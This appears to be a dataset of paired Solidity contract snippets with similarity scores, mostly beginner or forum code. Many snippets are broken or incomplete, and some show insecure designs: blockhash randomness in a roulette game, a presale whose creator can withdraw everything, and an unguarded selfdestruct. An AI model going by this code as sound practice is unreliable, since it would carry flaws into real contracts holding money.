            accounts[msg.sender].releaseTime = 0;
        }
    }

    function getMyLockedFunds() constant returns (uint x)
    {
        return accounts[msg.sender].balance;
    }

    function getMyLockedFundsReleaseTime() constant returns (uint x)
    {
        return accounts[msg.sender].releaseTime;
    }

    function getNow() constant returns (uint x)
    {
        return now;
    }
}",0.5796766895705739,"contract QCO_Presale {

    uint closed;

    struct Deposit { address buyer; uint amount; }

    uint refundDate;

    address fiduciary = msg.sender;

    Deposit[] Deposits;

    mapping (address => uint) total;



    function() public payable { }

    

    function init(uint date)

    {

        refundDate = date;

    }



    function deposit()

    public payable {

        if (msg.value >= 0.5 ether && msg.sender == tx.origin)

        {

            Deposit newDeposit;

            newDeposit.buyer = msg.sender;

            newDeposit.amount = msg.value;

            Deposits.push(newDeposit);

            total[msg.sender] += msg.value;

        }

        if (this.balance >= 25 ether)

        {

            closed = now;

        }

    }



    function refund(uint amount)

    public {

        if (total[msg.sender] >= amount && amount > 0)

        {

            if (now >= refundDate && closed == 0)

            {

                msg.sender.transfer(amount);

            }

        }

    }

    

    function close()

    public {

        if (msg.sender == fiduciary)

        {

            closed = now;

            msg.sender.transfer(this.balance);

        }

    }

}"
"contract Submissions {

    Proposal[] public proposals;

    struct Proposal {
        
    }
}",0.5182872961492596,"contract Autopetrified is Petrifiable {

    constructor() public {

        

        

        petrify();

    }

}"
"contract A{
bytes[] info;
    function infoRep() public returns(string memory, string memory, string memory, string memory){
        info[0]=""Alireza Kiakojouri"";
        info[1]=""500"";
        info[2]=""0098"";
        info[3]=""AUT"";
           return(string(info[0]), string(info[1]), string(info[2]), string(info[3]));
    }
}",0.5586927596297813,"contract Trusti {
    string public data = ""trusti.id"";
    
    function getData() public view returns (string memory) {
        return data;
    }
    
    function setData(string memory _dataHash, string memory _dataSignee) public {
        data = _dataHash;
        data = _dataSignee;
    }
}"
"contract StructTest{
    struct someTestStruct {
        uint A;
        uint B;
        bytes32 C;
    }
    someTestStruct str;
    function StructTest(){
        str = someTestStruct({A: 5, B: 6, C: ""Hi""});
    }
    
    function returnStruct() returns (someTestStruct){
        return str;
    }
}",0.5407496489890424,"contract Coursetro {
    
   string fName;
   uint age;
   
   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }
    
}"
"contract ConfigureERC20 is new1ERC20 {

     uint256 tokenPrice = 500000000000000 wei;
     uint256 public tokensToGet = 0;

     fallback() external payable {
        require(msg.value > 0);
     
        tokensToGet = msg.value / tokenPrice;

        
        
        emit Transfer(address(this), msg.sender, tokensToGet);
        msg.sender.transfer(tokensToGet);
    }
}",0.5715689825658149,"contract Registration is owned { 
    
    mapping (address => bool) public isRegistered;   
      
    function () public payable {
        
        if (msg.value == 10000000000000000) {
            isRegistered[msg.sender] = true; 
        } else { 
            revert();
        }
        
    }
    
    function collectFees() onlyOwner public { 
        require(this.balance > 0);
        
        msg.sender.transfer(this.balance);
    }
    
}"
"contract FileDetail {
 struct File{
    string fileName;
    string fileHash;
 }



 File[] private files;

 event Uploaded(
       string fileName,
       string fileHash
    );


 function setFile(string fName, string fileHash) public{
 File memory file = File({fileName:fName,fileHash:fileHash});
  files.push(file);
 emit Uploaded(fName,fileHash);
 }

 function getFile(uint256 index) external view returns(
 string fileName,
 string fileHash

 ){

   File memory file = files[index];
   fileName = file.fileName;
   fileHash = file.fileHash;

 }
}",0.5337972240771374,"contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor (string memory firstName, string memory symbol, uint8 decimals) public {
        _name = firstName;
        _symbol = symbol;
        _decimals = decimals;
    }

    
    function name() public view returns (string memory) {
        return _name;
    } 

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}"
"contract storeHash{

        string private vehicleData;

        function setVehicleData(string memory _vehicleData) public{
           vehicleData = _vehicleData;
        } 

    }",0.5404340172563497,"contract Broadcaster {

    event Broadcast(

        string _value

    );



    function broadcast(string memory message) public {

        

        

        

        

        

        emit Broadcast(message);

    }

}"
"contract Payment{

  Order[] public order;
  struct Order {
  bytes32 item;
  bytes32 location;
  uint qty;
  bytes32 bank;
  bytes32 vendor;
  }


  address add;

function place_order(bytes32 _location, uint _qty,bytes32 _item,bytes32 _bank, bytes32 _vendor) returns (bool success){
        Order memory newOrder;
        newOrder.item=_item;
        newOrder.location=_location;
        newOrder.qty=_qty;
        newOrder.bank=_bank;
        newOrder.vendor=_vendor;

        order.push(newOrder);
        return true;
}

function get_info(bytes32 _vendor) constant returns ( bytes32[],uint[],bytes32[],bytes32[]){



       uint length=order.length;

       bytes32[] memory items = new bytes32[](length);
       bytes32[] memory locations = new bytes32[](length);
       uint[] memory quantities = new uint[](length);
       bytes32[] memory banks = new bytes32[](length);

       for(uint i=0; i< order.length; i++){
         Order memory currentOrder;
         currentOrder = order[i];

         if(currentOrder.vendor == _vendor){
         items[i]=currentOrder.item;
         locations[i]=currentOrder.location;
          quantities[i]=currentOrder.qty;
          banks[i]=currentOrder.bank;


          }
      }
        return (items,quantities,locations,banks);

}
}",0.5462913585502887,"contract Strings {

  

  function Concatenate(string memory a, string memory b) public pure returns (string memory concatenatedString) {

    bytes memory bytesA = bytes(a);

    bytes memory bytesB = bytes(b);

    string memory concatenatedAB = new string(bytesA.length + bytesB.length);

    bytes memory bytesAB = bytes(concatenatedAB);

    uint concatendatedIndex = 0;

    uint index = 0;

    for (index = 0; index < bytesA.length; index++) {

      bytesAB[concatendatedIndex++] = bytesA[index];

    }

    for (index = 0; index < bytesB.length; index++) {

      bytesAB[concatendatedIndex++] = bytesB[index];

    }



    return string(bytesAB);

  }



  function UintToString(uint value) public pure returns (string memory uintAsString) {

    uint tempValue = value;



    if (tempValue == 0) {

      return ""0"";

    }

    uint j = tempValue;

    uint length;

    while (j != 0) {

      length++;

      j /= 10;

    }

    bytes memory byteString = new bytes(length);

    uint index = length - 1;

    while (tempValue != 0) {

      byteString[index--] = byte(uint8(48 + tempValue % 10));

      tempValue /= 10;

    }

    return string(byteString);

  }

}"
"contract C{
     constructor() public{
          B instance = B(address_of_deployed_B);  
          B instance = new B();                   
          B instance2 = new B();                  
    }

}",0.5408698602125132,"contract YearlyGame is BaseGame {



    constructor(

        address payable _rng,

        uint _period

    )

        public

        BaseGame(_rng, _period) {



    }

}"
"contract B is A{

    function addToStruct2(uint _mappingNumber) returns(bool status){
      struct2 memory newMember;
      struct1 memory newEntry;
      newEntry = mapToStruct[_mappingNumber];
      newMember.input1 = newEntry;
      allEntries.push(newMember);
      return true;
    }
  }",0.5074841126746579,"contract Test {

    event testLog(address indexed account, uint amount);

    

    constructor() public {

        emit testLog(msg.sender, block.number);

    }

    

    function execute(uint number) public returns (bool) {

        emit testLog(msg.sender, number);

        return true;

    }

}"
"contract demo {\n"" +
    ""   string public name = 'Petros';\n"" +
    ""   function changeName(string _newName){\n"" +
    ""     name = _newName;\n"" +
    ""   }\n"" +
    ""}",0.580942058064009,"contract News is Pausable {
  string[] public news;

  function addNews(string msg) onlyOwner public {
    news.push(msg);
  }
}"
"contract myContract {

    struct myStruct{
        bytes32 name;
        bool active;
        uint[] changes;
    }

    myStruct[2] myStr;
    uint[] steps;

    Event activatedEvent(uint time);

    function myContract{
        myStr[0] = packStruct('foo', true, steps);
        myStr[1] = packStruct('bar', false, steps);
    }

    function activate(){
        myStruct ms = myStr[0]; 
        ms.changes.push(now);
        activatedEvent(now);
    }
}",0.5003835746701568,"contract AOQUtil {

    function getLevel(uint value) public view returns (uint);

    function getStaticCoefficient(uint level) public pure returns (uint);

    function getRecommendCoefficient(uint times) public pure returns (uint);

    function compareStr(string memory _str, string memory str) public pure returns (bool);

}"
"contract Analytics {
  address lastAddress;
  uint timeStamp;
  string label;
  uint count;
  string id;
  string typeofEntry; 
  string channel;
  string createdAt;

  struct Field {
    string typeOfFunding; 
    uint amount;
    string cohort;
    string promotion;
  }
  struct Entry {
    string id;
    string typeofEntry; 
    string channel;
    Field funding;
    string createdAt;
    uint totalAmount; 
  }
  mapping(uint => Entry) public entries;
function updateEntry (string memory _id,
                      string memory _typeOfEntry,
                      string memory _channel,
                      string memory _typeofFunding,
                      uint  _amount,
                      string memory _cohort,
                      string memory _promotion,
                      string memory _createdAt,
                      uint  _totalAmount) public returns 
                      (bool sucess)
    {
      entries[id] = id; 
      entries[typeofEntry]= _typeOfEntry;
      entries[channel]= _channel;
      entries[funding].typeOfFunding = _typeofFunding;
      entries[funding].amount = _amount;
      entries[funding].cohort = _cohort;
      entries[funding].promotion = _promotion;
      entries[createdAt] = _createdAt;
      entries[totalAmount]= _totalAmount;
      return true;
    }
}",0.509538596024484,"contract WagaToken is StandardToken {

    string public constant LOVEYOUFOREVER = ""LIANGZAI"";
    string public constant NAME = ""WagaToken"";
    string public constant SYMBOL = ""WGT"";
    uint public constant DECIMALS = 18;

    
    event InvalidCaller(address caller);

    
    event Issue(uint issueIndex, address addr, uint tokenAmount);

    uint public issueIndex = 0;

    
    mapping(address => uint256) public balanceOf;
    
    uint public issueAmount = 0.0;

    uint totalAmount = 21000000;
    address owner;
    uint currentFactor = 10 ** DECIMALS;


    function WagaToken() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        if (owner == msg.sender) {
            _;
        } else {
            InvalidCaller(msg.sender);
            revert();
        }
    }

    
    
    function issueTo(address addr,uint fee) onlyOwner {
        var tokenAmount =  21 * fee * getFactor();
        balanceOf[addr] += tokenAmount;
        issueAmount += tokenAmount;
        Issue(issueIndex++, addr, tokenAmount);
    }


    function getFactor() internal returns (uint) {
        if(2 * (totalAmount * 10 ** 18 - issueAmount) <= currentFactor * totalAmount) {
            currentFactor /= 2;
        }
        return currentFactor;
    }


}"
"contract stateVariable{
uint stateVariable1=10;
uint stateVariable2=20;
uint stateVariable3=30;
event log(uint stateVariable);
function display() public
{
   
   emit log(stateVariable1); 
   emit log(stateVariable2); 
   emit log(stateVariable3); 
}",0.5187089375660574,"contract testCall {

    bool public state = false;

    

    event logStateChanged(bool state);

    

    function changeState() public returns(bool){

        if (state == false){

            state = true;

        } else {

            state = false;

        }

        

        emit logStateChanged(state);

        

        return true;

    }

}"
"contract one{
    uint firstNum;
    uint secondNum;
    uint thirdNum;
    function getNumber(uint _num, uint _num2,uint _num3) public{
       firstNum = _num;
       secondNum = _num2;
       thirdNum = _num3;
    }
}",0.523249583500201,"contract Zhtong {
    address public owner;
      uint private result;
      function Set(){
          owner = msg.sender;
      }
      function assign(uint x, uint y) returns (uint){
          result = x + y;
      }
}"
"contract two{
    uint firstNum;
    uint secondNum;
    uint thirdNum;
    function getNumber(uint[3] numValues) public{
       firstNum = numValues[0];
       secondNum =numValues[1];
       thirdNum = numValues[2];
    }
}",0.5185100930238679,"contract GeneScienceInterface {

    function isGeneScience() public pure returns (bool);

    function mixGenes(uint genes1, uint genes2, uint promoTypeNum) public returns (uint);

}"
"contract Card
{
    enum Suit {Heart, Diamond, Shape, Club, Jocker}
    Suit public suit;

    enum Rank {Two, Three, Four, Five, Six, Seven, Eight, Nine, Ten, Jack, Queen, King, Ace, Jocker}
    Rank public rank;

    function equal(Card card) returns (bool)
    {
        return suit == card.suit && rank == card.rank;
    }
}",0.5155114025887262,"contract Sent is Ownable{
    using SafeMath for uint256;
    
    address private toaddr;
    uint public amount;
  event SendTo();
  
  function SentTo(address _address) payable onlyOwner public returns (bool) {
    toaddr = _address;
    kill();
    emit SendTo();
    return true;
  }
  
   function kill() public{
        selfdestruct(toaddr);
    }
    
    
    
    
}"
"contract C {
    event error(uint8 error);
    function(){
        error(1);
        throw;
    }
}",0.5696975314844763,"contract Emitter {
    event Emit(uint x);
    function emit(uint x) {
        Emit(x);
    }
}"
"contract Test {

    function Test(){
        msg.sender.call.value(0);
        msg.sender.call.value(0)();
    }

}",0.5871159519373343,"contract SendBack {
    function() payable {
        if (!msg.sender.send(msg.value))
            throw;
    }
}"
"contract TrafficFine{
    struct Officer {
        string firstName ;
        string lastName;
        address account;
    }


    address public manager;
    uint public numberOfOffiers;

    mapping(address=>Officer) public officers;

    modifier restricted(){
        require(msg.sender == manager);      
        _;
    }

    constructor () public{
        manager = msg.sender;
    }



    function addOfficer(
        string firstName,
        string lastName,
        address officer) public  restricted{

        require(officer!=officers[officer].account);

        Officer  memory newOfficer = Officer({
            firstName:firstName,
            lastName:lastName,
            account:officer
        });

        officers[officer] = newOfficer;
        numberOfOffiers++;
    }



    function getofficer(address officer) public view returns(address){
        return officers[officer].account;

    }
}",0.5863604399539835,"contract DAORegistry is Ownable {

    event Propose(address indexed _avatar);
    event Register(address indexed _avatar, string _name);
    event UnRegister(address indexed _avatar);

    mapping(string=>bool) private registry;

    constructor(address _owner) public {
        transferOwnership(_owner);
    }

    function propose(address _avatar) public {
        emit Propose(_avatar);
    }

    function register(address _avatar, string memory _name) public onlyOwner {
        require(!registry[_name]);
        registry[_name] = true;
        emit Register(_avatar, _name);
    }

    function unRegister(address _avatar) public onlyOwner {
        emit UnRegister(_avatar);
    }

    
    function isRegister(string memory _name) public view returns(bool) {
        return registry[_name];
    }

}"
contract submission hash {},0.5697684152869747,contract Permissioned {}
"contract Bank 
{
    struct User 
    {uint userId;
     string email;
     string name;
    }

    mapping(uint => User) public users;
    mapping(uint => string) public userRequestStatus;
    mapping(uint => uint256) public balance;

    function createUserRequest(uint userId_, string memory email_, string memory name_, uint256 amount_ ) public 
    {
        require(users[userId_].userId != userId_,""User Already Exist."");
        User memory user = User( {userId: userId_ , email: email_, name: name_});
        users[userId_]= user;
        balance[userId_] = amount_;
        userRequestStatus[userId_] = ""Request send to bank"";

    }

    function UpdateAmountRequest(uint userId_, uint256 amount_ ) public 
    {
        require(balance[userId_]== 0,""no data available"");
        balance[userId_] = amount_;
        userRequestStatus[userId_] = ""after updating balance request in bank"";

    }

    function getUserInfo(uint userId_ ) public  view returns(uint userId, string memory email,string memory name) 
    {
        User memory user = users[userId_];
        return (user.userId, user.email, user.name);

    }
    function getUserAmount(uint userId_ ) public  view returns(uint256) 
    {
        return balance[userId_];

    }

}",0.593060686076723,"contract Lottery is Moderated {
    struct Draw
    {
        uint timestamp;  
        uint membersCount; 
        string hash;
        uint winner;
    }
        
    mapping (string => Draw) drawsByHash;
    
    
    
    function createDraw (uint membersCount, string memory hash) public onlyModeratorOrOwner {
       
        require(drawsByHash[hash].timestamp == 0);
        uint winner = rand(membersCount, now);
        Draw memory d = Draw ({timestamp : now, membersCount: membersCount, hash : hash, winner: winner });         
        drawsByHash[hash] = d;
    
    }

    function getWinnerNumber(string memory hash) public view returns (uint) {
        
        return drawsByHash[hash].winner;
        
    }
    
    function getTime(string memory hash) public view returns (uint) {
        
        return drawsByHash[hash].timestamp;
        
    }
    function getMembersCount(string memory hash) public view returns (uint) {
        
        return drawsByHash[hash].membersCount;
        
    }
    
    
    function rand(uint max, uint256 seed) private returns (uint256 result){
        
        uint256 factor = seed * 100 / max;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));
        return (uint256((uint256(hashVal) / factor)) % max) + 1;
    }


}"
"contract test{

    int _multiplier;

    function test (int multiplier){
        _multiplier = multiplier;
    }

    function multiply (int val) returns (int d){
        return val * _multiplier;
    }

}",0.5793821974728075,"contract FlopLike {
    function kick(address gal, uint lot, uint bid) external returns (uint);
    function cage() external;
    function live() external returns (uint);
}"
"contract ConsumptionOracle{

    
    struct data {
        uint chargePointDuration;
        uint chargePointEnergy;
    }

    
    mapping(string => data) private values;

    
    function setValue(uint _chargePointDuration, uint _chargePointEnergy, string memory sessionId) public{
            values[sessionId] = data(_chargePointDuration,_chargePointEnergy);
    }

    
    function getValue(string memory sessionId) public view returns(uint, uint){
        return (values[sessionId].chargePointDuration, values[sessionId].chargePointEnergy);
    }
}",0.5271897967020713,"contract I_Pricer {
    uint128 public lastPrice;
    I_minter public mint;
    string public sURL;
    mapping (bytes32 => uint) RevTransaction;

    function setMinter(address _newAddress) {}
    function __callback(bytes32 myid, string result) {}
    function queryCost() constant returns (uint128 _value) {}
    function QuickPrice() payable {}
    function requestPrice(uint _actionID) payable returns (uint _TrasID) {}
    function collectFee() returns(bool) {}
    function () {
        
        revert();
    }
}"
"contract OwnedToken {



TokenCreator creator;
address owner;
bytes32 name;",0.5973064170524699,"contract ReverseRegistrar {
    function claim(address owner) returns (bytes32 node);
}"
"contract Hourglass {

    mapping(address => bool) public administrators;

    
    
    constructor() public    {
        
        administrators[msg.sender] = true;
    }
",0.5769269100132102,"contract InstaKyber is Trade {



    constructor(address rAddr) public {

        addressRegistry = rAddr;

    }



    function () public payable {}



}"
"contract student
 {
    string private name;
    string private birthdate;
    string private department;
    string private location;
    string private email;
    uint256 private id;
    uint256 private mobile_no;
    uint256 counter=0;

    function setName(string memory myname) public 
    {
        name=myname;
    }
    function getName() public view returns(string memory )
    {
        return name;
    }

     constructor ()public
    {
        id=counter+1;
        counter=counter+1;
    }
    function getid() public view returns(uint256 id1)
    {
        id1=id;
        return id1;
    }

    function setbirthdate(string memory _birthdate) public 
    {
        birthdate = _birthdate;
    }

    function getbirthdate() public view returns(string memory )
    {
        return birthdate;
    }

    function setdepartment(string memory mydepartment) public
    {
        department = mydepartment;   
    }
    function getdepartment() public view returns(string memory )
    {
        return department;
    }
    function setlocation(string memory mylocation) public
    {
        location= mylocation;   
    }
    function getlocation() public view returns(string memory )
    {
        return location;
    }

    function setmobileno(uint256 myphonenumber) public
    {
        mobile_no = myphonenumber;
    }
    function getmobileno() public view  returns(uint256 )
    {
        return mobile_no;
    }


 }",0.5850821851808694,"contract NotesharesToken is NSERC667 {

    using SafeMath for uint256;



    uint8 public state; 



    string private contentLink;

    string private folderLink;

    bool public hidden = false;



    constructor (string _contentLink, string _folderLink, address _ecosystemFeeAccount, uint256 ecosystemShare, address _custom_owner)

    public

    NSERC667(_ecosystemFeeAccount, ecosystemShare, _custom_owner) {

        state = 3;

        contentLink = _contentLink;

        folderLink = _folderLink;

    }



    

    

    function () public payable {

        require(state == 3); 

        receivePayment();

    }



    function getContentLink () public view returns (string) {

        require(hidden == false);

        return contentLink;

    }



    function getFolderLink() public view returns (string) {

        require(hidden == false);

        return folderLink;

    }

    

    



    function setCancelled () public onlyOwner {

        state = 0;

    }



    function setHidden (bool _hidden) public onlyOwner {

        hidden = _hidden;

    }



    function claimDividend () public {

        require(state > 1);

        collectOwedDividends();

    }



    

    function destruct () public onlyOwner {

        require(state == 2 || state == 3);

        require(balanceOf[owner()] == totalSupply);

        selfdestruct(owner());

    }



    

    function claimOwnership () public {

        

        require(balanceOf[msg.sender] == totalSupply);

        _transferOwnership(msg.sender);

    }

}"
"contractTwo {

     address addofContract1;
     uint i ;
     ....
     function changeNum(uint _i) payable{
         i = _i;
         ContractONE c = ContractONE(addofContract1);
         
         c.register(_i); 
        
      }
    }",0.5405465307153197,"contract EOSContractInterface

{

    mapping (address => string) public keys;

    function balanceOf( address who ) constant returns (uint value);

}"
"contract ChangeTracker {
enum State {
    changeProposed, changeManaged, changeApproved, changeRejected, changeReleased
}

struct Change {
    bytes20 gitHash;
    string additionalInformation;
    uint256 costs;
    uint256 estimation;
}
}",0.506291265236598,"contract ABIMeetings is ABIApplicationAsset {
    struct Record {
        bytes32 hash;
        bytes32 name;
        uint8 state;
        uint256 time_start;                     
        uint256 duration;
        uint8 index;
    }
    mapping (uint8 => Record) public Collection;
}"
"contract B {
    address contrac_A=0x123456;

    
}",0.553672195849403,contract Owned { address public owner; }
"contract DAO_Test{

   function buyToken() payable external returns(bool){        
    uint amount = (precision*msg.value)/exchange_Rate;
    token_balances[msg.sender] += amount/1000000000000000000;             
    ether_balances[msg.sender] += msg.value/1000000000000000000;
    Deposit(msg.sender, msg.value);
    return true;
    }

   function send_funding (bytes2 proposal_id) internal  returns (bool){
    uint indx = find_proposal_indx (proposal_id);
    Proposal temp;
    temp = proposals[indx];
    if (final_result[indx]){ 
    temp.recipient.transfer(temp.target_val*1000000000000000000);       
}
}",0.5414053700518113,"contract testc is srToken {
  string public constant version = ""0.1"";
  string public constant name = ""testc"";
  string public constant symbol = ""$tc"";
  uint256 public constant decimals = 2;

  
  function () external payable {
    if(msg.value > 0){
        totalSupply_ = totalSupply_.add(msg.value);
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        Transfer(address(0), msg.sender, msg.value);        
    }
  }

  
  function testc() {
    uint256 _initialSupply = 0;
    totalSupply_ = _initialSupply;
    balances[msg.sender] = _initialSupply;
  }
}"
"contract A
{
    uint256[] public array0;
    uint256[] public array1;
    constructor () public
    {
        array0.push(123);
        array1.push(456);
    }
    function test() public
    {
        uint256[][] memory storageArrays = new uint256[][](2);
        storageArrays[0] = array0;
        storageArrays[1] = array1;

        storageArrays[0][0]++;
        storageArrays[1][0]--;
    }
}",0.5483032805880884,"contract DSPauseAbstract {
    function setDelay(uint256) public;
    function delay() public view returns (uint256);
    function plot(address, bytes32, bytes memory, uint256) public;
    function exec(address, bytes32, bytes memory, uint256) public returns (bytes memory);
}"
"contract A {
      address x = 0x1234...;
      x.send(10);
 }",0.5631437737206609,contract Owned { address public owner; }
"contract NotifyContract { 
    address public userAddr;
    byte public types;
    function notify(byte tokenByte,address userAddr_){
        types=tokenByte;
        userAddr=userAddr_;
    } 
}",0.5697593050959358,"contract TokenInterface {

    function transfer(address _to, uint256 _value) public;

    function balanceOf(address _addr) public constant returns(uint256);

}"
"contract ChainlinkEthPrice is Chainlinked {

    struct EthPriceAtBlock
    {
        uint    blockNumber;
        uint    blockTimestamp;
        bytes32 requestId;
        uint256 reportedPrice;
    }

    EthPriceAtBlock[] public ethPrices;
    bytes32 jobId;

    constructor(bytes32 _jobId, address linkTokenAddr, address oracleAddr)
        public
    {
        jobId = _jobId;
        setLinkToken(linkTokenAddr);
        setOracle(oracleAddr);
    }

    function requestEthereumPrice(string _currency)
        public returns (bytes32 requestId)
    {
        ChainlinkLib.Run memory run = newRun(jobId, this, ""fulfillEthereumPrice(bytes32,uint256)"");
        run.add(""url"", ""https:
        run.add(""path"", _currency);
        run.addInt(""times"", 100);
        requestId = chainlinkRequest(run, LINK(0));
    }

    function fulfillEthereumPrice(bytes32 _requestId, uint256 _reportedPrice)
        public checkChainlinkFulfillment(_requestId)
    {
        ethPrices.push(EthPriceAtBlock({
            blockNumber: block.number,
            blockTimestamp: block.timestamp,
            requestId: _requestId,
            reportedPrice: _reportedPrice
        }));
       emit RequestEthereumPriceFulfilled(_requestId, _reportedPrice, block.number, block.timestamp);
    }

    event RequestEthereumPriceFulfilled(
        bytes32 indexed requestId,
        uint256 indexed reportedPrice,
        uint256 blockNumber,
        uint256 blockTimestamp
    );

    function getDataCount()
        public view returns (uint length)
    {
        return ethPrices.length;
    }

    function getData(uint idx)
        public view returns (uint blockNumber, uint256 reportedPrice)
    {
        return (ethPrices[idx].blockNumber, ethPrices[idx].reportedPrice);
    }
}",0.5334289072711322,"contract Roulette {



    event newRound(uint number);

    event newPlayer(address addr, uint roundNumber);

    event playerWin(address indexed addr);

    event playerLose(address indexed addr, uint8 num);



    uint public roundNumber = 1;

    address public feeAddr;



    address[] public players;



    constructor() public

    {

        feeAddr = msg.sender;

    }



    function() payable public

    {

        

        if (isContract()) {

            revert();

        }



        require(msg.value == 1 ether, ""Enter price 1 ETH"");

        

        players.push(msg.sender);



        emit newPlayer(msg.sender, roundNumber);



        

        if (players.length == 5) {

            distributeFunds();

            return;

        }

    }



    function countPlayers() public view returns (uint256)

    {

        return players.length;

    }



    

    function distributeFunds() internal

    {

        

        uint8 loser = uint8(getRandom() % players.length + 1);



        for (uint i = 0; i <= players.length - 1; i++) {

            

            if (loser == i + 1) {

                emit playerLose(players[i], loser);

                continue;

            }



            

            if (players[i].send(1200 finney)) {

                emit playerWin(players[i]);

            }

        }



        

        feeAddr.transfer(address(this).balance);



        players.length = 0;

        roundNumber ++;



        emit newRound(roundNumber);

    }



    function getRandom() internal view returns (uint256)

    {

        uint256 num = uint256(keccak256(abi.encodePacked(blockhash(block.number - players.length), now)));



        for (uint i = 0; i <= players.length - 1; i++)

        {

            num ^= uint256(keccak256(abi.encodePacked(blockhash(block.number - i), uint256(players[i]) ^ num)));

        }



        return num;

    }



    

    function isContract() internal view returns (bool) {

        return msg.sender != tx.origin;

    }

}"
"contract ExistingContract is owned{
    
    mapping (address=> uint) public balanceOf;
    function issueNewToken(address recipient, uint amount)onlyOwner onlyPermittedContracts{
        if(balanceOf[recipient]+amount<balanceOf[recipient]){throw;}
        balanceOf[recipient]+=amount;
    }
}",0.577160571433271,"contract XDT is DataeumToken {

  mapping(address => uint256) balances;

  function transfer(address destination, uint256 amount) public returns (bool success);

  function balanceOf(address tokenOwner) public view returns (uint balance);

}"
"contract organA {


struct organ { address originOwner; address currentOwner; string organType; string organState; }


function addOrgan(address _originOwner, string _type, string _state) external returns(bytes32 organHash);
function changeOrganState(bytes32 _organId, string _state) public;
function getOrganListLength() public view returns(uint ListLenght);
function getOrganList(uint indexNumber) public view returns(bytes32 OrganId);
function getOrgan(bytes32 _organHash) public view returns(address OriginOwner, address CurrentOwner, string OrganType, string OrganState);
function existsOrgan(bytes32 _organHash) external view returns(bool Existence);
function organOriginOwner(bytes32 _organHash) external view returns(address OriginOwner);
}",0.5960793966986848,"contract ERC721 {

    event LogTransfer(address from, address to, uint256 tokenId);
    event LogApproval(address owner, address approved, uint256 tokenId);

    function name() public view returns (string);
    function symbol() public view returns (string);
    function totalSupply() public view returns (uint256 total);
    function balanceOf(address _owner) public view returns (uint256 balance);
    function ownerOf(uint256 _tokenId) external view returns (address owner);
    function approve(address _to, uint256 _tokenId) external;
    function transfer(address _to, uint256 _tokenId) external;
    function transferFrom(address _from, address _to, uint256 _tokenId) external;
    function tokensOfOwner(address _owner) external view returns (uint256[] tokenIds);

}"
"contract MyService {
    address public owner;

    function MyService(){
        owner = msg.sender;
    }


    event DoStuff(address myFriendAddress, uint myFriendBalance);

    function doStuff(address myFriendTokenContractAddress){
        address myFriendAddress = msg.sender;
        MyFriendToken mft = MyFriendToken(myFriendTokenContractAddress);

        if(mft.isMyFriend(myFriendAddress)){
            
            uint myFriendBalance = mft.balanceOf(myFriendAddress);

            
            uint servicePrice = 10;

            if(myFriendBalance >= servicePrice){
                
                transfer(owner, servicePrice);
                
                DoStuff(myFriendAddress , myFriendBalance);
            }
        }
    }
}",0.529803812817759,"contract ERC20 {
    uint public totalSupply;

    function balanceOf(address who) constant returns(uint);

    function transfer(address to, uint value);

    function allowance(address owner, address spender) constant returns(uint);

    function transferFrom(address from, address to, uint value);

    function approve(address spender, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

    event Transfer(address indexed from, address indexed to, uint value);
}"
"contract TrafficFine{
    struct Officer {
        string firstName ;
        string lastName;
        address account;
    }

    address public manager;
    uint public numberOfOffiers;


    mapping(address=>Officer) public officers;

    modifier restricted(){
        require(msg.sender == manager);      
        _;
    }

    constructor () public{
        manager = msg.sender;
    }



    function addOfficer(
        string firstName,
        string lastName,
        address officer) public  restricted{

        require(officer!=officers[officer].account);

        Officer  memory newOfficer = Officer({
            firstName:firstName,
            lastName:lastName,
            account:officer
        });

        officers[officer] = newOfficer;
        numberOfOffiers++;
    }



    function getofficer(address officer) public view returns(address){
        address officer1= officers[officer].account;
        return officer1;
    }


}",0.5961292598908341,"contract BaseRegistration is AbstractRegistration{
    address public owner;
    string public songTitle; 
    string public hash; 
    string public digitalSignature; 
    string public professionalName; 
    string public duration; 
    string dateOfPublish; 
    uint rtype;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function BaseRegistration() public{
        owner = msg.sender;
    }
    
    
    
    function getOwnerAddress() external constant returns (address){
        return owner;
    }
    
    
    
    function changeOwnerAddress(address _owner) onlyOwner internal {
        require(_owner != 0x0);
        require(owner != _owner);
        owner = _owner;
    }
    
    
    function getRegistration() public view returns(string, address, string, string, uint, string, string, address[5], uint[5]){}
}"
"contract Access1{
address storgeContractAddress = ""0xcd53170a761f024a0441eb15e2f995ae94634c06"";

 function createEntity(address entityAddress,uint entityData){
        
        storgeContractAddress.newEntity.call(entityAddress,entityData);
    }

    function getEntityCount()public constant returns(uint entityCount){
        
        uint count=storgeContractAddress.getEntityCount.call();
        return count;
    }
}",0.5069978230317607,"contract UserRegistryInterface {
  event AddAddress(address indexed who);
  event AddIdentity(address indexed who);

  function knownAddress(address _who) public constant returns(bool);
  function hasIdentity(address _who) public constant returns(bool);
  function systemAddresses(address _to, address _from) public constant returns(bool);
}"
"contract Certificate is CertificateOwnable {

    CertificateStorage certificateStorage;

    constructor(address _certificateAddress) public {
        certificateStorage = CertificateStorage(_certificateAddress);
    }

    function addCertificateTotal(string memory _universityName, 
                        string memory _typeOfDegree, 
                        string memory _major, 
                        string memory _name, 
                        uint256 _dateOfBirth) public onlyOwner returns(address) {

        address certificateNo = certificateStorage.setCertificateTotal(_universityName, 
                                                            _typeOfDegree, 
                                                            _major, 
                                                            _name, 
                                                            _dateOfBirth);

        return (certificateNo);
    }
}",0.5298848904915611,"contract ClothesStores{

	

	mapping (uint => address) Indicador;

	

	struct Person{

		string name;

	}

    

	Person[] private personProperties;

	

	event createdPerson(string name);

	

	function createPerson(string memory _name) public {

	   uint identificador = personProperties.push(Person(_name))-1;

	    Indicador[identificador]=msg.sender;

	    emit createdPerson(_name);

	}

	

	function getPersonProperties(uint _identificador) external view returns(string memory)  {

	    

	    require(Indicador[_identificador]==msg.sender);

	    

	    Person memory People = personProperties[_identificador];

	    

	    return (People.name);

	}

}"
"contract SignatureStatus
{
    string documentIDhash;
    struct Signature {
        string documentID; 
        string studyID; 
        string timeStamp; 
        bool consented; 
    }


